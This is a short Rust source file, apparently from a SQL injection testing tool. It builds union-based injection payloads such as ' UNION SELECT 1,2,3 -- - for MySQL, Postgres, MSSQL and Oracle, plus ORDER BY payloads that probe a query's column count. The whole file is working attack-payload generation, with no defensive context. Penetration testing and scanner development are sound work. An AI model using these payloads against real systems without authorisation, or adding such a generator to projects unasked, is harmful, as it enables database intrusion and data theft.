#![deny(unsafe_code)]

/// Union-based payloads per DBMS, with column count enumeration.
#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct UnionPayload {
    pub payload: String,
    pub dbms: String,
    pub columns: usize,
}

#[must_use]
pub fn union_payloads_for(dbms: Option<&str>, columns: usize) -> Vec<UnionPayload> {
    let cols = (1..=columns)
        .map(|i| i.to_string())
        .collect::<Vec<_>>()
        .join(",");
    let comment = match dbms {
        Some("mysql") => " -- -",
        Some("postgres") => " --",
        Some("mssql") => " --",
        Some("oracle") => " --",
        _ => " -- -",
    };
    // Second variant uses NULL as first column then cols-1 placeholders to keep total = columns
    let cols_null = if columns <= 1 {
        "NULL".to_owned()
    } else {
        let tail = (1..columns)
            .map(|i| i.to_string())
            .collect::<Vec<_>>()
            .join(",");
        format!("NULL,{tail}")
    };
    let base = match dbms {
        Some("mysql") => vec![
            (format!("' UNION SELECT {cols}{comment}"), "mysql"),
            (format!("' UNION SELECT {cols_null}{comment}"), "mysql"),
        ],
        Some("postgres") => vec![
            (format!("' UNION SELECT {cols}{comment}"), "postgres"),
            (format!("' UNION SELECT {cols_null}{comment}"), "postgres"),
        ],
        Some("mssql") => vec![
            (format!("' UNION SELECT {cols}{comment}"), "mssql"),
            (format!("' UNION SELECT {cols_null}{comment}"), "mssql"),
        ],
        Some("oracle") => vec![
            (
                format!("' UNION SELECT {cols} FROM dual{comment}"),
                "oracle",
            ),
            (
                format!("' UNION SELECT {cols_null} FROM dual{comment}"),
                "oracle",
            ),
        ],
        _ => vec![
            (format!("' UNION SELECT {cols}{comment}"), "generic"),
            (format!("' UNION SELECT {cols_null}{comment}"), "generic"),
            (format!("\" UNION SELECT {cols}{comment}"), "generic"),
        ],
    };
    base.into_iter()
        .map(|(p, d)| UnionPayload {
            payload: p,
            dbms: d.to_owned(),
            columns,
        })
        .collect()
}

/// Generate ORDER BY enumeration payloads to discover column count (e.g., ORDER BY 1 --).
#[must_use]
pub fn order_by_payloads(max_cols: usize) -> Vec<String> {
    (1..=max_cols)
        .map(|i| format!("' ORDER BY {i} -- -"))
        .collect()
}
